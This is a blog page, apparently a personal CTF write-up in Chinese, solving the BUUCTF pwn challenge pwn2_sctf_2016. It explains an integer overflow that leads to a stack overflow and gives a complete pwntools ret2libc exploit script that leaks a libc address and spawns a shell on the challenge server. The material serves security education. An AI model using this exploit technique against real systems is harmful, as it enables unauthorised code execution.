@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Pwn2_sctf_2016 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Pwn2_sctf_2016</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/03/10</h2>
+</div>
+
+<main>
+<h1 id="pwn2_sctf_2016">pwn2_sctf_2016</h1>
+<p>32位系统，只开启NX</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310221013860.png" alt="image-20200310221013860"></p>
+<p>考点：整数溢出、ret2libc3</p>
+<p>存在system的系统调用号，但是无/bin/sh，也没有好用的gadget所以决定ret2libc3</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310233308519.png" alt="image-20200310233308519"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310233331026.png" alt="image-20200310233331026"></p>
+<p>思路：</p>
+<p>1、整数溢出创造可以输入的数据非常大</p>
+<p>2、栈溢出构造rop来ret2libc3，从而getshell</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310225507284.png" alt="image-20200310225507284"></p>
+<p>这里的v2变量是为int型的-1可以绕过if(v2&gt;32)的判断，但是return之前的get_n()是以unsigned int来接收的v2，所以这里造成v2变得非常大(整数溢出)，这可以去了解c语言数据在内存中如何存储来理解漏洞的形成</p>
+<p>而这里的&amp;nptr的到栈底的偏移只有0x2c，所以造成栈溢出</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310221249854.png" alt="image-20200310221249854"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310221102432.png" alt="image-20200310221102432"></p>
+<p>计算stack offset = 0x2c + fakeebp = 0x2c +0x4 = 0x30 = 48字节</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310231658730.png" alt="image-20200310231658730"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-coding-UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">i386</span><span style="color:#e6db74">&#39;</span>
+context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">linux</span><span style="color:#e6db74">&#39;</span>
+
+<span style="color:#75715e">#sh = process(&#39;./pwn2_sctf_2016&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">29229</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./pwn2_sctf_2016</span><span style="color:#e6db74">&#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./x86-libc-2.23.so</span><span style="color:#e6db74">&#39;</span>)
+
+atoi_got_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span>]
+printf_plt_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">printf</span><span style="color:#e6db74">&#39;</span>]
+formatstr_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80486f8</span>         <span style="color:#75715e"># %s</span>
+main_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">main</span><span style="color:#e6db74">&#39;</span>]
+
+fakeebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2c</span> <span style="color:#f92672">+</span> fakeebp <span style="color:#75715e">#48字节</span>
+<span style="color:#75715e">#利用printf函数来leak在libc中的atoi函数</span>
+leak_payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> offset 
+leak_payload<span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(printf_plt_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(formatstr_addr) <span style="color:#f92672">+</span> p32(atoi_got_addr)
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">How many bytes do you want me to read?</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-1</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bytes of data!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,leak_payload)
+
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">You said: </span><span style="color:#e6db74">&#39;</span>)<span style="color:#75715e">#这里是接收main函数执行完的输出</span>
+sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">You said: </span><span style="color:#e6db74">&#39;</span>)<span style="color:#75715e">#这里才是接收rop链造成的输出，leak出的地址在这里面</span>
+atoi_realaddr <span style="color:#f92672">=</span> u32(sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf7</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:])
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">leak_atoi_real_addr =&gt; {}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hex(atoi_realaddr)))
+<span style="color:#75715e">#libcsearcher好像没有对应的libc</span>
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">libc = LibcSearcher(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,atoi_realaddr)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">base_addr = atoi_realaddr - libc.dump(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">system_addr = libc.dump(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">) + base_addr</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">binsh_addr = libc.dump(</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">str_bin_sh</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">) + base_addr</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+base_addr <span style="color:#f92672">=</span> atoi_realaddr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span>]
+system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">+</span> base_addr
+binsh_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>next() <span style="color:#f92672">+</span> base_addr
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> offset <span style="color:#f92672">+</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(binsh_addr)
+
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">How many bytes do you want me to read?</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-1</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bytes of data!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload)
+
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200310232904813.png" alt="image-20200310232904813"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
